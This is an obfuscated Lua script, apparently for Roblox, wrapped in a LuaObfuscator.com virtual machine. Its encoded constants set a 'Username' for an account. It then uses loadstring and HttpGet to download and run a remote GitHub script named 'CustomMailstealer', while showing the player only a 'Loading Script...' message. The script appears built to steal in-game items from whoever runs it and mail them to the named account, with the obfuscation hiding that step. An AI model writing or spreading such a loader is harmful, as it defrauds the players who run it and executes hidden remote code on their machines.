--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.19) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v84=0;while true do if (v84==0) then v19=v0(v3(v30,1,1));return "";end end else local v85=0;local v86;while true do if (v85==0) then v86=v2(v0(v30,16));if v19 then local v103=v5(v86,v19);v19=nil;return v103;else return v86;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v87=(v31/(2^(v32-(2 -1))))%((5 -3)^(((v33-(1 -0)) -(v32-(2 -1))) + (620 -(555 + (941 -(282 + 595)))))) ;return v87-(v87%(932 -(857 + (1711 -(1523 + 114))))) ;else local v88=0;local v89;while true do if (v88==(568 -(367 + 201))) then v89=2^(v32-((834 + 94) -(214 + 713))) ;return (((v31%(v89 + v89))>=v89) and (1 + 0)) or (0 + 0) ;end end end end local function v21()local v34=0 -0 ;local v35;while true do if (v34==(1066 -(68 + 997))) then return v35;end if (v34==(1270 -(226 + 1044))) then v35=v1(v16,v18,v18);v18=v18 + (118 -(32 + 85)) ;v34=4 -3 ;end end end local function v22()local v36,v37=v1(v16,v18,v18 + 2 + 0 );v18=v18 + 1 + 1 ;return (v37 * (1213 -(892 + 65))) + v36 ;end local function v23()local v38=0 -0 ;local v39;local v40;local v41;local v42;while true do if (v38==((952 -(802 + 150)) -0)) then v39,v40,v41,v42=v1(v16,v18,v18 + (4 -(2 -1)) );v18=v18 + ((1406 -1052) -(87 + (476 -213))) ;v38=181 -(67 + 113) ;end if (v38==(1 + 0)) then return (v42 * 16777216) + (v41 * (160901 -(69416 + 25949))) + (v40 * (189 + (1064 -(915 + 82)))) + v39 ;end end end local function v24()local v43=0 -0 ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if (v43==(2 + 1)) then if (v48==(0 -0)) then if (v47==0) then return v49 * (1187 -((3902 -2833) + 118)) ;else local v104=0 -0 ;while true do if (v104==0) then v48=1 -0 ;v46=0 + 0 ;break;end end end elseif (v48==(3636 -(5642 -4053))) then return ((v47==(0 + 0 + 0)) and (v49 * ((792 -(368 + 423))/(0 -0)))) or (v49 * NaN) ;end return v8(v49,v48-(1882 -(814 + 45)) ) * (v46 + (v47/((20 -(10 + 8))^((71 + 128) -147)))) ;end if (v43==(443 -(416 + 26))) then v46=3 -2 ;v47=(v20(v45,(886 -(261 + 624)) + (0 -0) ,20) * ((3 -1)^(470 -(145 + 293)))) + v44 ;v43=432 -(44 + 386) ;end if (v43==2) then v48=v20(v45,1507 -(998 + 488) ,10 + (51 -30) );v49=((v20(v45,27 + 5 )==(773 -(201 + 571))) and  -1) or (1139 -(116 + 1022)) ;v43=12 -9 ;end if (v43==(0 + 0)) then v44=v23();v45=v23();v43=1;end end end local function v25(v50)local v51=(848 + 232) -(1020 + 60) ;local v52;local v53;while true do if (v51==(1424 -(630 + 793))) then v52=v3(v16,v18,(v18 + v50) -(3 -2) );v18=v18 + v50 ;v51=9 -7 ;end if (v51==(2 + (1056 -(87 + 968)))) then return v6(v53);end if (v51==(6 -4)) then v53={};for v93=1748 -(760 + 987) , #v52 do v53[v93]=v2(v1(v3(v52,v93,v93)));end v51=1916 -(1789 + 124) ;end if (v51==((3371 -2605) -(745 + 21))) then v52=nil;if  not v50 then local v99=0 + 0 ;while true do if ((0 -0)==v99) then v50=v23();if (v50==0) then return "";end break;end end end v51=3 -(1 + 1) ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v54=26 -(11 + 15) ;local v55;local v56;local v57;local v58;local v59;local v60;local v61;local v62;local v63;while true do if (v54~=(198 -(26 + 168))) then else v63=nil;while true do if (v55==1) then local v100=0;while true do if (v100~=(0 -0)) then else v58=nil;v59=nil;v100=1;end if (v100==(879 -(284 + 594))) then v55=2;break;end end end if (v55~=2) then else local v101=0 -0 ;while true do if (v101==1) then v55=8 -5 ;break;end if (v101~=(166 -(122 + 44))) then else v60=nil;v61=nil;v101=1 -0 ;end end end if (v55==3) then v62=nil;v63=nil;v55=12 -8 ;end if (v55==0) then local v102=0 + 0 ;while true do if (v102==(0 + 0)) then v56=0 -0 ;v57=nil;v102=66 -(30 + 35) ;end if (v102~=1) then else v55=1;break;end end end if (v55==(3 + 1)) then while true do if (v56==3) then v63=nil;while true do local v117=0;local v118;while true do if (v117==(1257 -(1043 + 214))) then v118=0;while true do if (v118~=0) then else if (v57==(7 -5)) then local v171=1212 -(323 + 889) ;local v172;local v173;while true do if (v171==1) then while true do if ((0 -0)==v172) then v173=580 -(361 + 219) ;while true do if (v173==(321 -(53 + 267))) then for v184=1 + 0 ,v23() do local v185=0;local v186;local v187;local v188;while true do if (v185==0) then v186=0;v187=nil;v185=414 -(15 + 398) ;end if (v185~=1) then else v188=nil;while true do if ((982 -(18 + 964))==v186) then local v197=0;while true do if (0==v197) then v187=0 -0 ;v188=nil;v197=1 + 0 ;end if (v197==1) then v186=1 + 0 ;break;end end end if (v186==(851 -(20 + 830))) then while true do if (v187==(0 + 0)) then v188=v21();if (v20(v188,127 -(116 + 10) ,1 + 0 )==(738 -(542 + 196))) then local v201=0;local v202;local v203;local v204;local v205;local v206;while true do if (v201==(0 -0)) then local v207=0 + 0 ;while true do if (v207~=(1 + 0)) then else v201=1 + 0 ;break;end if (v207==(0 -0)) then v202=0;v203=nil;v207=1;end end end if (v201==1) then local v208=0 -0 ;while true do if ((1552 -(1126 + 425))==v208) then v201=407 -(118 + 287) ;break;end if (v208==0) then v204=nil;v205=nil;v208=3 -2 ;end end end if (v201~=2) then else v206=nil;while true do if (v202~=(1122 -(118 + 1003))) then else local v209=0 -0 ;while true do if (v209~=0) then else v205=nil;v206=nil;v209=378 -(142 + 235) ;end if (1==v209) then v202=2;break;end end end if (v202~=2) then else while true do if (v203==(0 -0)) then local v211=0 + 0 ;local v212;while true do if ((977 -(553 + 424))==v211) then v212=0 -0 ;while true do if (v212==(1 + 0)) then v203=1 + 0 ;break;end if (v212==0) then v204=v20(v188,2 + 0 ,3);v205=v20(v188,4,6);v212=1;end end break;end end end if (v203~=3) then else if (v20(v205,3,3)~=(1 + 0)) then else v206[4]=v63[v206[4]];end v58[v184]=v206;break;end if (v203==2) then local v214=0;local v215;while true do if (v214==(0 + 0)) then v215=0 -0 ;while true do if (v215==(0 -0)) then if (v20(v205,2 -1 ,1)==(1 + 0)) then v206[2]=v63[v206[2]];end if (v20(v205,9 -7 ,755 -(239 + 514) )==1) then v206[3]=v63[v206[3]];end v215=1;end if (v215==1) then v203=3;break;end end break;end end end if (v203~=(1 + 0)) then else local v216=0;local v217;while true do if (v216==(1329 -(797 + 532))) then v217=0 + 0 ;while true do if ((0 + 0)==v217) then local v220=0 -0 ;while true do if (v220~=(1202 -(373 + 829))) then else local v225=0;while true do if (v225~=(732 -(476 + 255))) then else v220=1;break;end if (v225==0) then v206={v22(),v22(),nil,nil};if (v204==0) then local v226=0;local v227;local v228;local v229;while true do if (v226~=(1 -0)) then else v229=nil;while true do if (0==v227) then v228=0 -0 ;v229=nil;v227=1;end if (v227==(239 -(64 + 174))) then while true do if (v228==0) then v229=0;while true do if (v229==(0 + 0)) then v206[3 -0 ]=v22();v206[4]=v22();break;end end break;end end break;end end break;end if (v226~=(336 -(144 + 192))) then else v227=0;v228=nil;v226=217 -(42 + 174) ;end end elseif (v204==1) then v206[3]=v23();elseif (v204==(2 + 0)) then v206[3 + 0 ]=v23() -((1 + 1)^16) ;elseif (v204==(1507 -(363 + 1141))) then local v232=0;local v233;while true do if (0==v232) then v233=1580 -(1183 + 397) ;while true do if (v233==(0 -0)) then v206[3 + 0 ]=v23() -((2 + 0)^(1991 -(1913 + 62))) ;v206[4]=v22();break;end end break;end end end v225=1 + 0 ;end end end if (v220==(2 -1)) then v217=1;break;end end end if ((1934 -(565 + 1368))~=v217) then else v203=2;break;end end break;end end end end break;end if (v202==0) then local v210=0 -0 ;while true do if (v210==(1661 -(1477 + 184))) then v203=0 -0 ;v204=nil;v210=1 + 0 ;end if (1~=v210) then else v202=1;break;end end end end break;end end end break;end end break;end end break;end end end v57=859 -(564 + 292) ;break;end if (v173==(0 -0)) then local v183=0;while true do if (v183==1) then v173=2 -1 ;break;end if (v183==(304 -(244 + 60))) then for v192=1,v62 do local v193=0 + 0 ;local v194;local v195;local v196;while true do if (v193==(477 -(41 + 435))) then v196=nil;while true do if (v194==(1002 -(938 + 63))) then if (v195==(1 + 0)) then v196=v21()~=0 ;elseif (v195==(1127 -(936 + 189))) then v196=v24();elseif (v195==3) then v196=v25();end v63[v192]=v196;break;end if (v194==0) then local v200=0 + 0 ;while true do if (v200~=(1614 -(1565 + 48))) then else v194=1;break;end if (v200==(0 + 0)) then v195=v21();v196=nil;v200=1139 -(782 + 356) ;end end end end break;end if (v193==(267 -(176 + 91))) then local v198=0 -0 ;while true do if (v198==(1 -0)) then v193=1;break;end if (v198==(1092 -(975 + 117))) then v194=0;v195=nil;v198=1876 -(157 + 1718) ;end end end end end v61[3 + 0 ]=v21();v183=1;end end end end break;end end break;end if (v171==(0 -0)) then v172=0 -0 ;v173=nil;v171=1;end end end if (v57~=1) then else local v174=1018 -(697 + 321) ;while true do if (v174~=(2 -1)) then else v63={};v57=2;break;end if (v174~=(0 -0)) then else local v178=0;local v179;while true do if (0~=v178) then else v179=0 -0 ;while true do if (v179==(0 + 0)) then v61={v58,v59,nil,v60};v62=v23();v179=1228 -(322 + 905) ;end if (v179~=1) then else v174=612 -(602 + 9) ;break;end end break;end end end end end v118=1;end if (v118==(1190 -(449 + 740))) then if (v57==(872 -(826 + 46))) then local v175=947 -(245 + 702) ;while true do if (v175~=1) then else v60={};v57=1;break;end if (v175==0) then local v180=0;local v181;while true do if (v180==0) then v181=0 -0 ;while true do if (v181==(0 + 0)) then v58={};v59={};v181=1;end if (v181==1) then v175=1;break;end end break;end end end end end if (v57==3) then local v176=1898 -(260 + 1638) ;local v177;while true do if (v176~=0) then else v177=0;while true do if (v177~=(440 -(382 + 58))) then else local v182=0;while true do if (v182~=(0 -0)) then else for v189=1,v23() do v59[v189-(1 + 0) ]=v28();end return v61;end end end end break;end end end break;end end break;end end end break;end if (v56==(0 -0)) then v57=0;v58=nil;v56=1;end if (v56~=(5 -3)) then else v61=nil;v62=nil;v56=3;end if (v56~=1) then else local v115=0;local v116;while true do if (v115==0) then v116=0;while true do if (v116==1) then v56=1207 -(902 + 303) ;break;end if (v116~=0) then else v59=nil;v60=nil;v116=1 -0 ;end end break;end end end end break;end end break;end if (v54==(2 -1)) then v57=nil;v58=nil;v54=1 + 1 ;end if (v54==(1690 -(1121 + 569))) then v55=214 -(22 + 192) ;v56=nil;v54=1;end if (v54==3) then v61=nil;v62=nil;v54=687 -(483 + 200) ;end if (v54~=(1465 -(1404 + 59))) then else v59=nil;v60=nil;v54=8 -5 ;end end end local function v29(v64,v65,v66)local v67=v64[1];local v68=v64[2];local v69=v64[3];return function(...)local v70=v67;local v71=v68;local v72=v69;local v73=v27;local v74=1;local v75= -1;local v76={};local v77={...};local v78=v12("#",...) -1 ;local v79={};local v80={};for v90=0,v78 do if (v90>=v72) then v76[v90-v72 ]=v77[v90 + 1 ];else v80[v90]=v77[v90 + 1 ];end end local v81=(v78-v72) + 1 ;local v82;local v83;while true do v82=v70[v74];v83=v82[1];if (v83<=5) then if (v83<=2) then if (v83<=0) then v66[v82[3]]=v80[v82[2]];elseif (v83==1) then local v119=v82[2];local v120=v80[v82[3]];v80[v119 + 1 ]=v120;v80[v119]=v120[v82[4]];elseif ((v82[3]=="_ENV") or (v82[3]=="getfenv")) then v80[v82[2]]=v66;else v80[v82[2]]=v66[v82[3]];end elseif (v83<=3) then local v107=v82[2];v80[v107]=v80[v107](v13(v80,v107 + 1 ,v75));elseif (v83>4) then if (v80[v82[2]]==v82[4]) then v74=v74 + 1 ;else v74=v82[3];end else v74=v82[3];end elseif (v83<=8) then if (v83<=6) then local v109=0;local v110;local v111;local v112;local v113;local v114;while true do if (v109==6) then v74=v82[3];break;end if (v109==3) then v82=v70[v74];v80[v82[2]]=v82[3];v74=v74 + 1 ;v82=v70[v74];v114=v82[2];v111,v112=v73(v80[v114](v13(v80,v114 + 1 ,v82[3])));v109=4;end if (v109==5) then v80[v114]=v80[v114](v13(v80,v114 + 1 ,v75));v74=v74 + 1 ;v82=v70[v74];v80[v82[2]]();v74=v74 + 1 ;v82=v70[v74];v109=6;end if (v109==2) then v82=v70[v74];v114=v82[2];v113=v80[v82[3]];v80[v114 + 1 ]=v113;v80[v114]=v113[v82[4]];v74=v74 + 1 ;v109=3;end if (v109==4) then v75=(v112 + v114) -1 ;v110=0;for v159=v114,v75 do local v160=0;while true do if (0==v160) then v110=v110 + 1 ;v80[v159]=v111[v110];break;end end end v74=v74 + 1 ;v82=v70[v74];v114=v82[2];v109=5;end if (v109==1) then v82=v70[v74];if ((v82[3]=="_ENV") or (v82[3]=="getfenv")) then v80[v82[2]]=v66;else v80[v82[2]]=v66[v82[3]];end v74=v74 + 1 ;v82=v70[v74];if ((v82[3]=="_ENV") or (v82[3]=="getfenv")) then v80[v82[2]]=v66;else v80[v82[2]]=v66[v82[3]];end v74=v74 + 1 ;v109=2;end if (v109==0) then v110=nil;v111,v112=nil;v113=nil;v114=nil;v66[v82[3]]=v80[v82[2]];v74=v74 + 1 ;v109=1;end end elseif (v83==7) then v66[v82[3]]=v80[v82[2]];v74=v74 + 1 ;v82=v70[v74];v80[v82[2]]=v82[3];v74=v74 + 1 ;v82=v70[v74];v66[v82[3]]=v80[v82[2]];v74=v74 + 1 ;v82=v70[v74];v80[v82[2]]=v82[3];v74=v74 + 1 ;v82=v70[v74];v74=v82[3];else local v129=v82[2];local v130,v131=v73(v80[v129](v13(v80,v129 + 1 ,v82[3])));v75=(v131 + v129) -1 ;local v132=0;for v153=v129,v75 do local v154=0;while true do if (0==v154) then v132=v132 + 1 ;v80[v153]=v130[v132];break;end end end end elseif (v83<=9) then do return;end elseif (v83==10) then v80[v82[2]]=v82[3];else v80[v82[2]]();end v74=v74 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!0C3O00028O00026O00F03F030D3O00475F4D61696C6D652O7361676503133O004D6F72692069732074686520626573743O2E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034B3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4C7970686572582F4D6F7269437573746F6D2F6D61696E2F437573746F6D4D61696C737465616C657203083O00557365726E616D65030D3O00632O6F6C636F6C656361742O30030F3O00475F4C6F6164696E675363722O656E03123O004C6F6164696E67205363726970744O2E00163O00120A3O00013O0026053O000D00010002002O043O000D000100120A000100043O001206000100033O00122O000100053O00122O000200063O00202O00020002000700122O000400086O000200046O00013O00024O00010001000100044O001500010026053O000100010001002O043O0001000100120A0001000A3O001207000100093O00122O0001000C3O00122O0001000B3O00124O00023O00044O000100012O00093O00017O00",v9(),...);